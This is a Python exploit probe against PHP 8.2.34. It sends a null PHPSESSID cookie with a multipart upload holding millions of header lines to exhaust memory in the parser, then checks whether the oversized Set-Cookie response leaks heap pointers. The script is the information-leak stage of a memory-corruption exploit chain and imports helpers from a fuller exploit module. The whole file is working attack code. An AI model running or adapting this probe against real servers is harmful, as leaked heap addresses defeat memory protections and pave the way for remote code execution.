#!/usr/bin/env python3
"""Probe: does the dinosn sub-8.3 LEAK ARM work on 8.2.34?

Leak arm = PHPSESSID=<NUL> + a file part whose header block is `nheaders`
short lines -> multipart parser OOMs while the session cookie is being sent,
leaving a dangling PS(id) that the follow-on request reads back through an
oversized Set-Cookie. We only test the LEAK here (is a Set-Cookie emitted
that carries 0x7f... heap pointers?), not the full fire chain.

Reuses php72/drive.py (arm_body, Conn).
"""
import os, re, struct, sys, collections
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "php72"))
import drive as D

HOST, PORT = "127.0.0.1", 18111
PATH = "/index.php"

def has_heap_ptr(data: bytes) -> bool:
    for off in range(0, len(data) - 8, 8):
        q = struct.unpack_from("<Q", data, off)[0]
        if 0x700000000000 <= q < 0x800000000000:
            return True
    return False

def probe(nheaders, sid=b"\x00", tailhdr=0):
    c = D.Conn(HOST, PORT, False)
    try:
        body = D.arm_body(nheaders, b"a:\n", sid, tailhdr=tailhdr)
        r = c.post(PATH, body, maxread=1 << 20)
        sc = r["headers"].get("set-cookie", "")
        return {
            "nheaders": nheaders, "wire": len(body),
            "status": r["status"], "closed": r["closed"],
            "set_cookie_len": len(sc), "body_len": r["total"],
            "heap_ptr": has_heap_ptr(sc.encode("latin-1")),
            "sc_head": sc[:80],
        }
    finally:
        c.close()

def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", default="1300000,2000000,3000000",
                    help="comma list of nheaders to try")
    ap.add_argument("--tailhdr", type=int, default=0)
    a = ap.parse_args()
    for n in [int(x) for x in a.n.split(",") if x.strip()]:
        res = probe(n, tailhdr=a.tailhdr)
        print("[%s] %s" % ("HIT" if res["heap_ptr"] and res["set_cookie_len"] > 64 else "miss",
                           res))

if __name__ == "__main__":
    main()
